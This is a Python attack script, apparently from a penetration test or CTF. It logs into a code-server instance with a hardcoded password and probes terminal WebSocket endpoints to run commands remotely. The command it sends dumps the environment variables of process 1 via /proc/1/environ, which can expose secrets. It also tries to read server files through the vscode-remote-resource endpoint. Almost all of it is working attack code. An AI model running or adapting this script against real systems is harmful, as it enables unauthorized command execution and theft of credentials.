import requests
import websocket
import threading
import time
import urllib3

urllib3.disable_warnings()

VSCODE_HOST = "198.18.116.130"
VSCODE_PORT = 8081
PASSWORD    = "d6876891639c7863f2449b37"
COMMAND     = "id && hostname && cat /proc/1/environ | tr '\\0' '\\n'"

# ============================================================
# Step 1 — Login and get cookie
# ============================================================
session = requests.Session()
base    = f"http://{VSCODE_HOST}:{VSCODE_PORT}"

r = session.post(
    f"{base}/login",
    data={"password": PASSWORD},
    allow_redirects=True,
    verify=False,
    timeout=5
)
print(f"Login: {r.status_code}")

# Build raw cookie string from ALL cookies
cookie_str = "; ".join([f"{k}={v}" 
                        for k, v in session.cookies.items()])
print(f"Cookie: {cookie_str[:100]}")

# ============================================================
# Step 2 — Find the right terminal WebSocket URL
# code-server versions use different paths
# ============================================================
output_lines = []
done         = threading.Event()
shell_ready  = threading.Event()

def on_message(ws, message):
    """Capture ALL output — raw bytes or text"""
    if isinstance(message, bytes):
        text = message.decode("utf-8", errors="replace")
    else:
        text = message
    
    output_lines.append(text)
    
    # Print immediately so we see it
    print(f"RAW< {repr(text)}")
    
    # Shell is ready when we see a prompt character
    if any(c in text for c in ["$", "#", ">"]):
        shell_ready.set()

def on_open(ws):
    print("WebSocket OPEN")
    
    # Wait for shell prompt before sending command
    # This is the key fix — don't send immediately
    print("Waiting for shell prompt...")
    shell_ready.wait(timeout=5)
    
    print(f"Sending command: {COMMAND}")
    # Send command
    ws.send(COMMAND + "\n")
    
    # Wait for output to arrive
    time.sleep(3)
    
    # Send a unique marker so we know output ended
    ws.send("echo '---END---'\n")
    time.sleep(2)
    done.set()

def on_error(ws, error):
    print(f"WS Error: {error}")
    done.set()

def on_close(ws, *args):
    print("WS Closed")
    done.set()

# ============================================================
# Try all known code-server terminal WebSocket paths
# ============================================================
ws_paths = [
    f"ws://{VSCODE_HOST}:{VSCODE_PORT}/terminal",
    f"ws://{VSCODE_HOST}:{VSCODE_PORT}/",
    f"ws://{VSCODE_HOST}:{VSCODE_PORT}/vscode/",
    # With commit hash we found earlier
    f"ws://{VSCODE_HOST}:{VSCODE_PORT}/stable-c36b2d3edd1cc8db7cfc49f5bc55711e7c5ac928/",
]

for ws_url in ws_paths:
    print(f"\n=== Trying: {ws_url} ===")
    output_lines.clear()
    done.clear()
    shell_ready.clear()
    
    ws = websocket.WebSocketApp(
        ws_url,
        header=[
            f"Cookie: {cookie_str}",
            f"Origin: http://{VSCODE_HOST}:{VSCODE_PORT}",
        ],
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    
    t = threading.Thread(
        target=ws.run_forever,
        kwargs={"sslopt": {"cert_reqs": 0}}
    )
    t.daemon = True
    t.start()
    
    done.wait(timeout=12)
    ws.close()
    t.join(timeout=2)
    
    full_output = "".join(output_lines)
    
    # Check if we got real output
    if full_output and len(full_output) > 10:
        print(f"\n{'='*50}")
        print(f"SUCCESS on: {ws_url}")
        print(f"{'='*50}")
        print(f"FULL OUTPUT:\n{full_output}")
        
        # Extract command output (between command and END marker)
        if "---END---" in full_output:
            start = full_output.find(COMMAND)
            end   = full_output.find("---END---")
            if start != -1 and end != -1:
                clean = full_output[start+len(COMMAND):end].strip()
                print(f"\nCLEAN OUTPUT:\n{clean}")
        break
    else:
        print(f"No output received on {ws_url}")
        
        
# Check what the WebSocket handshake returns
# This tells us what subprotocol code-server expects
import websocket

def check_ws_handshake(url, cookie_str):
    try:
        ws = websocket.create_connection(
            url,
            header=[
                f"Cookie: {cookie_str}",
                f"Origin: http://{VSCODE_HOST}:{VSCODE_PORT}",
            ],
            subprotocols=["terminal"],  # try with subprotocol
            sslopt={"cert_reqs": 0},
            timeout=5
        )
        print(f"Connected! Subprotocol: {ws.subprotocol}")
        
        # Send a simple newline and see what comes back
        ws.send("\n")
        time.sleep(1)
        ws.send("\n") 
        time.sleep(1)
        
        # Read everything available
        ws.settimeout(3)
        while True:
            try:
                msg = ws.recv()
                print(f"Got: {repr(msg)}")
            except websocket.WebSocketTimeoutException:
                break
        ws.close()
        
    except Exception as e:
        print(f"Failed: {e}")

# Also try reading the code-server source to find exact WS path
r = requests.get(
    f"http://{VSCODE_HOST}:{VSCODE_PORT}/vscode-remote-resource",
    params={"path": "/usr/lib/code-server/out/node/routes/index.js"},
    timeout=5
)
if r.status_code == 200:
    # Find websocket route definitions
    import re
    ws_routes = re.findall(
        r'["\'](/[^"\']*terminal[^"\']*)["\']', 
        r.text
    )
    print(f"Terminal routes in source: {ws_routes}")
    
    # Also find all wsRouter entries
    ws_all = re.findall(
        r'wsRouter\.[a-z]+\(["\']([^"\']+)["\']',
        r.text
    )
    print(f"All WS routes: {ws_all}")
